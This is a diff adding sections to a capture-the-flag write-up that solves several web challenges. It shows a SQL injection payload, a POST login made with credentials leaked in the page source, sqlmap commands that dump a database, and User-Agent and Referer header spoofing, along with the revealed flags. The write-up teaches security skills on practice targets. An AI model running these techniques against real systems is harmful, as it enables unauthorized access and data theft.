@@ -260,6 +260,128 @@ So let's try `Luke`. And we find that we need to inject.
 So an easy payload is `Luke' or '1'='1`
 And you can find the flag.
 
+### POST Practice
+*medium* (actually it's *easy*)
+
+Click the link and we can see the hint, which means we have to submit POST data.
+Check the source you can see `<!-- username: admin | password: 71urlkufpsdnlkadsf -->`
+
+So open burpsuite and capture the package and send a POST request by yourself.
+
+```HTTP
+POST http://165.227.106.113/post.php HTTP/1.1
+Host: 165.227.106.113
+...
+
+username=admin&password=71urlkufpsdnlkadsf
+```
+The flag is in the Response
+
+```
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html
+Date: Wed, 25 Mar 2020 08:24:14 GMT
+Server: nginx/1.4.6 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.22
+Content-Length: 32
+
+<h1>flag{p0st_d4t4_4ll_d4y}</h1>
+```
+
+### Prehashbrown
+
+*medium*
+
+Discription:
+I created a database of all known types of hashbrowns! Try to see if you can find a way to authenticate as an admin and retrieve the flag. Hashbrown Database
+
+Yes, the aim is clear, SQL injection.
+
+By checking the source code, we can find that the password is encrypted bt md5
+
+```javascript
+function hash() {
+            document.form.password.value = md5(document.form.password.value);
+
+            return true
+        }
+```
+
+But ok, we have another choice, register.
+So register a new account and login. Now we can see there is a search bar. And a hint under the bar.
+> No hashbrowns came up for that search
+
+Seems the search bar is vulnerable. Let's try to run sqlmap.
+
+***
+There are two ways to do POST injection via sqlmap
+
+1. `sqlmap -r xxx.txt` <font color="blue">The xxx.txt is the POST request</font>
+2. `sqlmap -u url  --data="name=value"`
+***
+
+Save the POST request as 1.txt and run sqlmap `sqlmap -r 1.txt --dbs --batch`
+<font color="grey">For some users like me, the param --proxy is necessary.</font>
+```
+sqlmap -r 1.txt -D prehashbrown --table --batch
+sqlmap -r 1.txt -D prehashbrown -T hashbrown --column  --batch --dump
+```
+And you can find the flag.
+
+### Don't Bump Your Head(er)
+*hard* (actually it's medium)
+
+Discription:Try to bypass my security measure on this site! http://165.227.106.113/header.php
+
+Click the link and you will find that your user-agent isn't right. Type `F12` to view the source code and you can find `<!-- Sup3rS3cr3tAg3nt  -->`
+
+So change the value of user-agent as `Sup3rS3cr3tAg3nt`
+And send the request
+```HTTP
+GET http://165.227.106.113/header.php HTTP/1.1
+Host: 165.227.106.113
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Sup3rS3cr3tAg3nt
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en,zh-TW;q=0.9,zh-CN;q=0.8,zh;q=0.7,fr;q=0.6
+Connection: close
+```
+
+In the response, you can find `Sorry, it seems as if you did not just come from the site, "awesomesauce.com".`
+Referer identifies the address of the webpage which is linked to the resource being requested. By checking referer, the new webpage can see where the request originated.
+Referer should be `awesomesauce.com`
+```HTTP
+GET http://165.227.106.113/header.php HTTP/1.1
+Host: 165.227.106.113
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Sup3rS3cr3tAg3nt
+Referer: awesomesauce.com
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en,zh-TW;q=0.9,zh-CN;q=0.8,zh;q=0.7,fr;q=0.6
+Connection: close`
+```
+
+The flag is in the response.
+```HTTP
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html
+Date: Wed, 25 Mar 2020 09:39:44 GMT
+Server: nginx/1.4.6 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.22
+Content-Length: 81
+
+Here is your flag: flag{did_this_m3ss_with_y0ur_h34d}
+<!-- Sup3rS3cr3tAg3nt  -->
+```
+
 ## Binary
 
 ### Lazy Game Challenge
